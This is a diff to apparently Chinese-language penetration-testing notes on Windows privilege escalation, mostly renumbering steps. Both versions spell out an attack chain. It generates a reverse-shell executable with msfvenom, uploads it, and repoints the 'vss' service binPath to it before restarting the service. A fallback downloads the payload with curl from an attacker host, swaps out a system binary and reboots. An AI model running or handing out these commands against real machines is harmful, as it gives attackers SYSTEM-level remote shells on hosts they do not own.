@@ -448,24 +448,23 @@ icacls E:\mysql\bin\mysql.exe
 - D - 删除
 ```
 ```bash
-# 提权步骤
-1. 生成反弹shell
+#提权步骤
+5.1.生成反弹shell
 msfvenom -p windows/shell_reverse_tcp LHOST=ip LPORT=port -f exe > shell.exe
-
-2. 上传文件（msf中执行）
+5.2.上传文件（msf中执行）
 upload shell.exe
-3. 修改服务binPath
+5.3.修改服务binPath
 sc.exe config vss binPath="C:\path\to\shell.exe"
 # road是你shell.exe下载到的路径
-4. 重启服务（需要有Server Operators权限）
+5.4.重启服务（需要有Server Operators权限）
 sc.exe stop vss
 sc.exe start vss
 # 备选方案：通过重启提权
 如果有关机权限，可以替换系统文件后重启：
-rename bd.exe bd.exe.bak
-curl http://ip:port/shell.exe -o bd.exe
-copy C:\xampp\htdocs\reverse.exe bd.exe
-shutdown -r -t 0
+5.1.rename bd.exe bd.exe.bak
+5.2.curl http://ip:port/shell.exe -o bd.exe
+5.3.copy C:\xampp\htdocs\reverse.exe bd.exe
+5.4.shutdown -r -t 0
 ```
 
 6. 后续可以修改文件，如果有重启权限就重启，大多数情况下没有，但都有开机重启，这个时候我们重新开机即可。
